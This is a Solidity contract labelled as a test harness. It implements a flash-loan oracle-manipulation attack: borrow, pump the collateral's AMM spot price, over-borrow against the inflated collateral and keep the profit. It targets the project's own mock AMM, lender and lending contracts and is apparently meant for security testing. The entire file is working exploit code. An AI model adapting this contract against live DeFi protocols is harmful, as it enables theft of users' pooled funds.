// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Token} from "../Token.sol";
import {SimpleAMM} from "../SimpleAMM.sol";
import {FlashLender, IFlashBorrower} from "../FlashLender.sol";
import {LendingBase} from "../LendingBase.sol";

/// @title OracleAttacker — TEST HARNESS (T2): flash-loan spot-price manipulation (bZx / Harvest pattern).
/// @notice 1. flash-borrow debt token  2. buy collateral on the AMM (pumps its spot price)
///         3. deposit it as collateral  4. borrow the max at the inflated price  5. repay the flash loan, keep the rest.
contract OracleAttacker is IFlashBorrower {
    address public immutable owner;
    FlashLender public immutable lender;

    event AttackExecuted(address indexed target, uint256 flashAmount, uint256 borrowed, uint256 profit);

    constructor(FlashLender lender_) {
        owner = msg.sender;
        lender = lender_;
    }

    function attack(LendingBase target, uint256 flashAmount) external returns (uint256 profit) {
        require(msg.sender == owner, "Attacker: only owner");
        Token debt = target.debtToken();
        lender.flashLoan(this, address(debt), flashAmount, abi.encode(target));
        profit = debt.balanceOf(address(this));
        require(debt.transfer(owner, profit), "Attacker: payout");
        emit AttackExecuted(address(target), flashAmount, target.debtOf(address(this)), profit);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        require(msg.sender == address(lender) && initiator == address(this), "Attacker: untrusted");
        LendingBase target = abi.decode(data, (LendingBase));
        SimpleAMM amm = target.amm();
        Token collateral = target.collateralToken();

        // pump the collateral's spot price
        Token(token).approve(address(amm), amount);
        uint256 bought = amm.swap(token, amount, 0, address(this));

        // borrow against it at the manipulated price
        collateral.approve(address(target), bought);
        target.deposit(bought);
        uint256 borrowAmt = target.maxBorrow(address(this));
        uint256 available = target.liquidity();
        if (borrowAmt > available) borrowAmt = available;
        target.borrow(borrowAmt);

        require(Token(token).balanceOf(address(this)) >= amount + fee, "Attacker: unprofitable");
        Token(token).approve(address(lender), amount + fee);
        return lender.CALLBACK_SUCCESS();
    }
}
